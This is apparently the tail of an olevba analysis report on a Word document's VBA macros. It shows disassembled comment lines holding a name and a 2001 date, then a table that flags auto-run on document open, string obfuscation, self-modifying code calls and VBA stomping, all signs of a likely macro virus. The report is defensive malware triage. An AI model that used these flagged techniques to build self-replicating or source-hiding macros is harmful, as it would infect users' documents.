' 	QuoteRem 0x0000 0x000C " YANKOVSKAYA"
' Line #485:
' 	QuoteRem 0x0000 0x0000 ""
' Line #486:
' Line #487:
' Line #488:
' Line #489:
' 	QuoteRem 0x0000 0x0014 " четвер, 26 Кві 2001"
' Line #490:
' 	QuoteRem 0x0000 0x0008 " Татьяна"
' Line #491:
' 	QuoteRem 0x0000 0x0000 ""
' Line #492:
' Line #493:
' Line #494:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

